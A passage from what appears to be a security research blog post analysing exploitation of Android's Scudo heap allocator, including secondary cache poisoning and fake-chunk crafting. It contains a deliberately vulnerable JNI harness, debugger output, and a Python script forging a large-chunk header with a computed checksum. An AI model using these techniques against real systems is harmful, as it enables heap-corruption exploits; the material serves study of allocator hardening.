&lt;li>can enable memory testing/probing? Not sure how to avoid SIGSEG though&amp;hellip;&lt;/li>
&lt;li>can make arbitrary (accessible) memory regions available to an attacker, if the attacker has information about the process image&amp;hellip;&lt;/li>
&lt;/ol>
&lt;p>With the above observations, we can infer that the least - significant 36 bits of an address that is supplied to &lt;code>free&lt;/code>, with the property that this address is less than or equal to the base address of the region containing chunks with id 1, determine the value that is added to the base address. To be precise, only bits &lt;strong>4-35&lt;/strong> (excluding bits 0, 1, 2, 3 and everything above 35) are relevant for the addition due to the right and left shifts. As in &lt;code>malloc&lt;/code> the compacted pointer is shifted to the left by &lt;code>4&lt;/code> and this shift operation is performed in a 64-bit register, this will result in the addend to be a multiple of &lt;code>0x10&lt;/code>, which matches the default alignment.&lt;/p>
&lt;p>Long story short, if we provided a fake chunk to &lt;code>free&lt;/code> with an address that is less than the base address of the region that belongs to the respective class id, then the next &lt;code>malloc&lt;/code> will cause a segmentation fault with high probability.&lt;/p>
&lt;h4 id="secondary-cache-poisoning">Secondary Cache Poisoning&lt;/h4>
&lt;p>It is also possible to introduce fake chunks into the secondary. To that end, we have to assume that the secondary is using a cache. Lets see some already familiar &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=1118;drc=b45a2ea782074944f79fc388df20b06e01f265f7">code&lt;/a> to clarify that:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">if&lt;/span> (LIKELY(ClassId)) {
...
TSD&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Cache.deallocate(ClassId, BlockBegin); &lt;span style="color:#75715e">// &amp;lt;-- primary free
&lt;/span>&lt;span style="color:#75715e">&lt;/span> ...
} &lt;span style="color:#66d9ef">else&lt;/span> {
...
Secondary.deallocate(Options, BlockBegin); &lt;span style="color:#75715e">// &amp;lt;-- secondary free
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>As we are interested in the secondary, we can focus on the implementation of &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=603">&lt;code>Secondary::deallocate&lt;/code>&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">template&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#66d9ef">typename&lt;/span> Config&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> MapAllocator&lt;span style="color:#f92672">&amp;lt;&lt;/span>Config&lt;span style="color:#f92672">&amp;gt;::&lt;/span>deallocate(Options Options, &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>Ptr) {
LargeBlock&lt;span style="color:#f92672">::&lt;/span>Header &lt;span style="color:#f92672">*&lt;/span>H &lt;span style="color:#f92672">=&lt;/span> LargeBlock&lt;span style="color:#f92672">::&lt;/span>getHeader&lt;span style="color:#f92672">&amp;lt;&lt;/span>Config&lt;span style="color:#f92672">&amp;gt;&lt;/span>(Ptr);
&lt;span style="color:#66d9ef">const&lt;/span> uptr CommitSize &lt;span style="color:#f92672">=&lt;/span> H&lt;span style="color:#f92672">-&amp;gt;&lt;/span>CommitSize;
{
ScopedLock &lt;span style="color:#a6e22e">L&lt;/span>(Mutex);
InUseBlocks.remove(H); &lt;span style="color:#75715e">// doubly linked list remove (??unlink??); can abort
&lt;/span>&lt;span style="color:#75715e">&lt;/span> FreedBytes &lt;span style="color:#f92672">+=&lt;/span> CommitSize;
NumberOfFrees&lt;span style="color:#f92672">++&lt;/span>;
Stats.sub(StatAllocated, CommitSize);
Stats.sub(StatMapped, H&lt;span style="color:#f92672">-&amp;gt;&lt;/span>MapSize);
}
Cache.store(Options, H); &lt;span style="color:#75715e">// caching or munmap, if enabled; otherwise just munmap
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>First of all, &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=476">&lt;code>InUseBlocks&lt;/code>&lt;/a> is a &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/list.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=139">doubly linked list&lt;/a>, which contains all allocated secondary chunks. Also, some cache object is used to &amp;ldquo;free&amp;rdquo; the chunk. Taking an attacker&amp;rsquo;s perspective, we assume that we can control the entire &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=34">&lt;code>LargeBlock::Header&lt;/code>&lt;/a>:&lt;/p>
&lt;ol>
&lt;li>&lt;code>Prev&lt;/code> and &lt;code>Next&lt;/code> pointers that make the header a part of a doubly linked list.&lt;/li>
&lt;li>&lt;code>CommitBase&lt;/code>. Actual starting point of the chunk. Most of the time &lt;code>CommitBase = MapBase + PageSize&lt;/code>.&lt;/li>
&lt;li>&lt;code>CommitSize&lt;/code>. Actual chunk size to be used. Most of the time &lt;code>CommitSize = 2 * PageSize + RequestedSize&lt;/code>.&lt;/li>
&lt;li>&lt;code>MapBase&lt;/code>. Used for &lt;code>munmap&lt;/code>. What is really returned by &lt;code>mmap&lt;/code>.&lt;/li>
&lt;li>&lt;code>MapSize&lt;/code>. Used for &lt;code>munmap&lt;/code>. What is really used when using &lt;code>mmap&lt;/code> to allocate memory.&lt;/li>
&lt;li>&lt;code>Data&lt;/code>. Actually &lt;code>sizeof (Data) = 0&lt;/code>, so we can ignore this!&lt;/li>
&lt;/ol>
&lt;p>Now we can start to tamper around with some, if not all, of those fields.&lt;/p>
&lt;h5 id="excursion-to-remove">Excursion to remove&lt;/h5>
&lt;p>Anyone, who is familiar with the &lt;a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">unlink exploit&lt;/a>, might now scream to investigate &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/list.h;l=199;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>DoublyLinkedList::remove&lt;/code>&lt;/a>. As we have to pass through this method anyways, we can do a quick analysis:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#75715e">// The consistency of the adjacent links is aggressively checked in order to
&lt;/span>&lt;span style="color:#75715e">// catch potential corruption attempts, that could yield a mirrored
&lt;/span>&lt;span style="color:#75715e">// write-{4,8} primitive. nullptr checks are deemed less vital. &amp;lt;-- I think they know already :(
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">remove&lt;/span>(T &lt;span style="color:#f92672">*&lt;/span>X) {
T &lt;span style="color:#f92672">*&lt;/span>Prev &lt;span style="color:#f92672">=&lt;/span> X&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Prev;
T &lt;span style="color:#f92672">*&lt;/span>Next &lt;span style="color:#f92672">=&lt;/span> X&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Next;
&lt;span style="color:#66d9ef">if&lt;/span> (Prev) {
CHECK_EQ(Prev&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Next, X);
Prev&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Next &lt;span style="color:#f92672">=&lt;/span> Next;
}
&lt;span style="color:#66d9ef">if&lt;/span> (Next) {
CHECK_EQ(Next&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Prev, X);
Next&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Prev &lt;span style="color:#f92672">=&lt;/span> Prev;
}
&lt;span style="color:#66d9ef">if&lt;/span> (First &lt;span style="color:#f92672">==&lt;/span> X) {
DCHECK_EQ(Prev, &lt;span style="color:#66d9ef">nullptr&lt;/span>);
First &lt;span style="color:#f92672">=&lt;/span> Next;
} &lt;span style="color:#66d9ef">else&lt;/span> {
DCHECK_NE(Prev, &lt;span style="color:#66d9ef">nullptr&lt;/span>);
}
&lt;span style="color:#66d9ef">if&lt;/span> (Last &lt;span style="color:#f92672">==&lt;/span> X) {
DCHECK_EQ(Next, &lt;span style="color:#66d9ef">nullptr&lt;/span>);
Last &lt;span style="color:#f92672">=&lt;/span> Prev;
} &lt;span style="color:#66d9ef">else&lt;/span> {
DCHECK_NE(Next, &lt;span style="color:#66d9ef">nullptr&lt;/span>);
}
Size&lt;span style="color:#f92672">--&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Lets formulate two questions of interest:&lt;/p>
&lt;ol>
&lt;li>How can we abuse &lt;code>LargeBlock::Header::Next&lt;/code> and &lt;code>LargeBlock::Header::Prev&lt;/code> to get a &lt;em>Write - What - Where&lt;/em> condition?&lt;/li>
&lt;li>How do we pass through this method without triggering an &lt;code>abort&lt;/code>, i.e. without failing any of the assertions like &lt;code>CHECK_EQ(Prev-&amp;gt;Next, X)&lt;/code>?&lt;/li>
&lt;/ol>
&lt;p>Starting off easy, we can see that choosing &lt;code>X-&amp;gt;Next = X-&amp;gt;Prev = 0&lt;/code> will cause execution of &lt;code>DCHECK_NE(Prev, nullptr)&lt;/code> and &lt;code>DCHECK_NE(Next, nullptr)&lt;/code>. Observe that &lt;code>X&lt;/code>, i.e. our fake large header is &lt;strong>not&lt;/strong> part of the list. Therefore &lt;code>First != X&lt;/code> and &lt;code>Last != X&lt;/code>!&lt;/p>
&lt;p>Setting &lt;code>X-&amp;gt;Next = buffer&lt;/code> and &lt;code>X-&amp;gt;Prev = 0&lt;/code> results in a call to &lt;code>CHECK_EQ(Next-&amp;gt;Prev, X)&lt;/code>. Thus, our &lt;code>buffer&lt;/code> has to contain a pointer that points back to &lt;code>X&lt;/code>, which seems pretty unlikely, but still possible. Still, as &lt;code>First != X&lt;/code> and &lt;code>X-&amp;gt;Prev = 0&lt;/code> we abort due to &lt;code>DCHECK_NE(Prev, nullptr)&lt;/code>.&lt;/p>
&lt;p>Finally, &lt;code>X-&amp;gt;Next = buffer_0&lt;/code> and &lt;code>X-&amp;gt;Prev = buffer_1&lt;/code> enforces &lt;code>buffer_0&lt;/code> and &lt;code>buffer_1&lt;/code> to contain pointers that point back to &lt;code>X&lt;/code>.&lt;/p>
&lt;p>A trivial way of passing this function is to choose &lt;code>X-&amp;gt;Next = X-&amp;gt;Prev = X&lt;/code>. This ensures that &lt;code>X-&amp;gt;Next&lt;/code> and &lt;code>X-&amp;gt;Prev&lt;/code> always point back to &lt;code>X&lt;/code> with non - zero pointers. Notice that this requires that we know the address of &lt;code>X&lt;/code>! If this is the case, then &lt;code>DoublyLinkedList::remove&lt;/code> behaves &lt;em>almost&lt;/em> like a &lt;code>nop&lt;/code>, with the side effect that &lt;code>Size -= 1&lt;/code> per call. (see &lt;a href="#future-work">future work&lt;/a> for more)&lt;/p>
&lt;p>Also notice that &lt;code>Prev-&amp;gt;Next&lt;/code> and &lt;code>Next-&amp;gt;Prev&lt;/code> will only be overwritten, if they point back to &lt;code>X&lt;/code>. As &lt;code>X&lt;/code> is most likely not part of the &lt;code>InUseBlocks&lt;/code> list, this implies that we can already write to those locations or we can only write to locations that point back to our buffer. Thus, a &lt;em>Write - What - Where&lt;/em> condition seems impossible on first analysis.&lt;/p>
&lt;h5 id="introducing-fake-chunks-to-secondary">Introducing Fake Chunks to Secondary&lt;/h5>
&lt;p>The &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/allocator_config.h;l=83">&lt;code>AndroidConfig&lt;/code>&lt;/a> defines the &lt;code>SecondaryCache&lt;/code> to be of type &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=129">&lt;code>MapAllocatorCache&lt;/code>&lt;/a>. Therefore, there is another caching layer to be bypassed / abused.&lt;/p>
&lt;p>If &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=145;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">&lt;code>Cache.store&lt;/code>&lt;/a> cannot cache the chunk that is currently freed, then the chunk will just be unmapped using &lt;code>munmap&lt;/code>.&lt;/p>
&lt;p>If we passed the &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=146;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">&lt;code>canCache&lt;/code>&lt;/a> check, it should be possible to craft fake chunks for the secondary as well, because of the caching mechanism. To that end, assuming that &lt;code>canCache(H-&amp;gt;CommitSize) == true&lt;/code>, we end up in the following code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">...
&lt;span style="color:#66d9ef">if&lt;/span> (Config&lt;span style="color:#f92672">::&lt;/span>SecondaryCacheQuarantineSize &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>
useMemoryTagging&lt;span style="color:#f92672">&amp;lt;&lt;/span>Config&lt;span style="color:#f92672">&amp;gt;&lt;/span>(Options)) {
QuarantinePos &lt;span style="color:#f92672">=&lt;/span>
(QuarantinePos &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">%&lt;/span> Max(Config&lt;span style="color:#f92672">::&lt;/span>SecondaryCacheQuarantineSize, &lt;span style="color:#ae81ff">1u&lt;/span>);
[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>Quarantine[QuarantinePos].CommitBase) {
Quarantine[QuarantinePos] &lt;span style="color:#f92672">=&lt;/span> Entry;
&lt;span style="color:#66d9ef">return&lt;/span>;
}
[&lt;span style="color:#ae81ff">2&lt;/span>] CachedBlock PrevEntry &lt;span style="color:#f92672">=&lt;/span> Quarantine[QuarantinePos];
Quarantine[QuarantinePos] &lt;span style="color:#f92672">=&lt;/span> Entry;
&lt;span style="color:#66d9ef">if&lt;/span> (OldestTime &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
OldestTime &lt;span style="color:#f92672">=&lt;/span> Entry.Time;
Entry &lt;span style="color:#f92672">=&lt;/span> PrevEntry;
}
&lt;span style="color:#66d9ef">if&lt;/span> (EntriesCount &lt;span style="color:#f92672">&amp;gt;=&lt;/span> MaxCount) {
&lt;span style="color:#66d9ef">if&lt;/span> (IsFullEvents&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">4U&lt;/span>)
EmptyCache &lt;span style="color:#f92672">=&lt;/span> true;
} &lt;span style="color:#66d9ef">else&lt;/span> {
[&lt;span style="color:#ae81ff">3&lt;/span>] &lt;span style="color:#66d9ef">for&lt;/span> (u32 I &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; I &lt;span style="color:#f92672">&amp;lt;&lt;/span> MaxCount; I&lt;span style="color:#f92672">++&lt;/span>) {
&lt;span style="color:#66d9ef">if&lt;/span> (Entries[I].CommitBase)
&lt;span style="color:#66d9ef">continue&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (I &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
Entries[I] &lt;span style="color:#f92672">=&lt;/span> Entries[&lt;span style="color:#ae81ff">0&lt;/span>];
Entries[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> Entry;
EntriesCount&lt;span style="color:#f92672">++&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (OldestTime &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
OldestTime &lt;span style="color:#f92672">=&lt;/span> Entry.Time;
EntryCached &lt;span style="color:#f92672">=&lt;/span> true;
&lt;span style="color:#66d9ef">break&lt;/span>;
}
}
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Thus there are three interesting paths of execution:&lt;/p>
&lt;ol>
&lt;li>No quarantine, i.e. we only run [3], which results in our chunks being placed in the cache!&lt;/li>
&lt;li>Non - full Quarantine, i.e. we run [1]. This will place our entry in the quarantine, but not in the cache! Eventually, the chunk will be cached, but it requires a full cycle of &lt;code>QuarantinePos&lt;/code> for that to happen in this function (maybe there is another function that also increments &lt;code>QuarantinePos&lt;/code>).&lt;/li>
&lt;li>Full Quarantine, i.e. we run [2]. Therefore, if the quarantine is filled with entries, this function will fetch the next entry from the quarantine, put our chunk into the quarantine and cache the fetched entry.&lt;/li>
&lt;/ol>
&lt;p>A trivial attack for that is to fill the quarantine by calling &lt;code>scudo_free&lt;/code> on a crafted large chunk &lt;em>that passes all the checks&lt;/em>. Then, after at most &lt;code>Max(Config::SecondaryCacheQuarantineSize, 1u) + 1&lt;/code> many calls we are guaranteed to have our chunk cached. Afterwards, when calling &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=497;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>MapAllocator::allocate&lt;/code>&lt;/a>, this will result in &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=229;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>Cache::retrieve&lt;/code>&lt;/a> returning the first non - null cache entry, which is, with high probability (ignoring multi-threaded access), our fake chunk. This is similar to &lt;a href="#primary-poisoning">crafting a fake chunk with the primary&lt;/a>, although we should not be limited by &lt;a href="#fake-chunk-mispositioning">decompacting a pointer&lt;/a>.&lt;/p>
&lt;p>It does not seem like there is memory tagging enabled on my system. Therefore, there is no need to bypass the quarantine with the above attack&amp;hellip;the fake chunk can be added to the cache directly.&lt;/p>
&lt;p>Lets try to craft a fake chunk for the secondary. To that end, lets assume we have the following setup:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#75715e">#define BUFFER_SIZE 0x100
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">uint8_t&lt;/span> buffer[BUFFER_SIZE] &lt;span style="color:#f92672">=&lt;/span> { &lt;span style="color:#ae81ff">0&lt;/span> };
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>called) {
called&lt;span style="color:#f92672">++&lt;/span>;
jbyteArray ar &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray(env, &lt;span style="color:#ae81ff">8&lt;/span>);
jbyte &lt;span style="color:#f92672">*&lt;/span>leak &lt;span style="color:#f92672">=&lt;/span> (jbyte&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>buffer;
(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion(env, ar, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>leak);
&lt;span style="color:#66d9ef">return&lt;/span> ar;
}
&lt;span style="color:#66d9ef">uint8_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>raw &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">uint8_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetByteArrayElements(env, chunk, NULL);
&lt;span style="color:#66d9ef">uint32_t&lt;/span> length &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetArrayLength(env, chunk);
&lt;span style="color:#66d9ef">if&lt;/span> (raw) {
memcpy(buffer, raw, (length &lt;span style="color:#f92672">&amp;lt;=&lt;/span> BUFFER_SIZE) &lt;span style="color:#f92672">?&lt;/span> length : BUFFER_SIZE);
&lt;span style="color:#75715e">// Brings attacker - controlled chunk into secondary cache
&lt;/span>&lt;span style="color:#75715e">&lt;/span> free(buffer &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x30&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span>); &lt;span style="color:#75715e">// large header + combined header
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">// Triggers potential write - what - where condition. This could also be triggered by another
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// thread, although it might be problematic what that thread will write and how much...
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">uint8_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>write_trigger &lt;span style="color:#f92672">=&lt;/span> malloc(length &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x40&lt;/span>);
memcpy(write_trigger, raw &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x40&lt;/span>, length &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x40&lt;/span>);
free(write_trigger);
}
&lt;span style="color:#66d9ef">return&lt;/span> NULL;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>On first execution of the above code snippet, the address of &lt;code>buffer = 0x7babf29407b0&lt;/code> will be leaked. For any other execution, we will try to call &lt;code>free(buffer + 0x30 + 0x10)&lt;/code> and &lt;code>malloc(length - 0x40)&lt;/code>. Notice that &lt;code>length&lt;/code> will be the length of the whole chunk including the headers. When calling &lt;code>malloc&lt;/code> we have to provide the size of the user data that does not include the headers!&lt;/p>
&lt;p>Setting a breakpoint right before &lt;code>free&lt;/code> yields:&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ i r rdi
rdi 0x7babf29407f0 0x7babf29407f0
gef➤ x/8gx $rdi-0x40
0x7babf29407b0: 0x00007babf29407b0 0x00007babf29407b0 &amp;lt;--
0x7babf29407c0: 0x00007babf29407f0 0x0000000000080040 |-- large header
0x7babf29407d0: 0xffffffffffffffff 0xffffffffffffffff &amp;lt;--
0x7babf29407e0: 0xd82d000000000100 0x0000000000000000 &amp;lt;-- combined header + 8 bytes padding
&lt;/code>&lt;/pre>&lt;p>Again, if we pass all the checks, i.e. provided a correct large chunk, then the app will &lt;strong>not&lt;/strong> abort and not cause a segfault. Also observe that the &lt;code>LargeBlock::Header::Prev&lt;/code> and &lt;code>LargeBlock::Header::Next&lt;/code> both point to the beginning of &lt;code>LargeBlock::Header&lt;/code>. This is because the header has to pass &lt;code>InUseChunks.remove(H)&lt;/code>.&lt;/p>
&lt;p>The header could be crafted in the following way:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e"># Craft large header&lt;/span>
lhdr &lt;span style="color:#f92672">=&lt;/span> large_header()
lhdr&lt;span style="color:#f92672">.&lt;/span>Prev &lt;span style="color:#f92672">=&lt;/span> pointer &lt;span style="color:#75715e"># ensure that DoublyLinkedList::remove is nop&lt;/span>
lhdr&lt;span style="color:#f92672">.&lt;/span>Next &lt;span style="color:#f92672">=&lt;/span> pointer
lhdr&lt;span style="color:#f92672">.&lt;/span>CommitBase &lt;span style="color:#f92672">=&lt;/span> pointer &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x30&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span> &lt;span style="color:#75715e"># pointer to user data&lt;/span>
lhdr&lt;span style="color:#f92672">.&lt;/span>CommitSize &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x400&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x200&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x40&lt;/span> &lt;span style="color:#75715e"># data + headers&lt;/span>
lhdr&lt;span style="color:#f92672">.&lt;/span>MapBase &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span> &lt;span style="color:#75715e"># irrelevant; for debugging reasons set to -1&lt;/span>
lhdr&lt;span style="color:#f92672">.&lt;/span>MapSize &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span> &lt;span style="color:#75715e"># irrelevant; for debugging reasons set to -1&lt;/span>
&lt;span style="color:#75715e"># Combined header&lt;/span>
combined_header &lt;span style="color:#f92672">=&lt;/span> unpacked_header()
combined_header&lt;span style="color:#f92672">.&lt;/span>ClassId &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#75715e"># Secondary allocations have class id 0&lt;/span>
combined_header&lt;span style="color:#f92672">.&lt;/span>State &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#75715e"># = allocated&lt;/span>
combined_header&lt;span style="color:#f92672">.&lt;/span>SizeOrUnusedBytes &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#75715e"># irrelevant&lt;/span>
combined_header&lt;span style="color:#f92672">.&lt;/span>OriginOrWasZeroed &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#75715e"># = malloc&amp;#39;ed chunk&lt;/span>
combined_header&lt;span style="color:#f92672">.&lt;/span>Offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#75715e"># irrelevant (for now)&lt;/span>
combined_header&lt;span style="color:#f92672">.&lt;/span>Checksum &lt;span style="color:#f92672">=&lt;/span> utils&lt;span style="color:#f92672">.&lt;/span>android_crc32(
cookie,
pointer &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x30&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span>, &lt;span style="color:#75715e"># user data pointer: sizeof (LargeBlock::Header) = 0x30, sizeof (Chunk::UnpackedHeader) = 0x8, 8 bytes padding -&amp;gt; 0x40&lt;/span>
combined_header&lt;span style="color:#f92672">.&lt;/span>pack()
)
&lt;span style="color:#75715e"># Send chunk&lt;/span>
data &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x42&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x400&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x200&lt;/span> &lt;span style="color:#75715e"># 512KiB to trigger secondary allocation&lt;/span>
io&lt;span style="color:#f92672">.&lt;/span>forward(lhdr&lt;span style="color:#f92672">.&lt;/span>bytes() &lt;span style="color:#f92672">+&lt;/span> combined_header&lt;span style="color:#f92672">.&lt;/span>bytes() &lt;span style="color:#f92672">+&lt;/span> p64(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> data)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Notice that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=287">&lt;code>canCache&lt;/code>&lt;/a> imposes an upper bound on &lt;code>LargeBlock::Header::CommitSize&lt;/code>, which is &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/allocator_config.h;l=113;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">&lt;code>2 &amp;lt;&amp;lt; 20&lt;/code>&lt;/a>. Observe that there is no lower bound to &lt;code>LargeBlock::Header::CommitSize&lt;/code> that restricts us from introducing a fake chunk into the cache (see &lt;a href="#neat-little-side-effect">later&lt;/a> for more on a lower bound)! (see &lt;a href="#future-work">future work&lt;/a> for an attack idea that abuses the fact that &lt;code>malloc&lt;/code> calls do not have any control over the size field. This implies that allocations that are in size range of the primary will be taken from the primary. Setting &lt;code>fake.CommitSize &amp;lt;= &amp;lt;max primary allocation size&amp;gt;&lt;/code> will result in a dead cache entry, because it will be smaller than &lt;strong>any&lt;/strong> requested size allocated by the secondary assuming that the primary did not fail to allocate)&lt;/p>
&lt;p>Right before calling &lt;code>malloc(buffer + 0x40)&lt;/code> we have:&lt;/p>
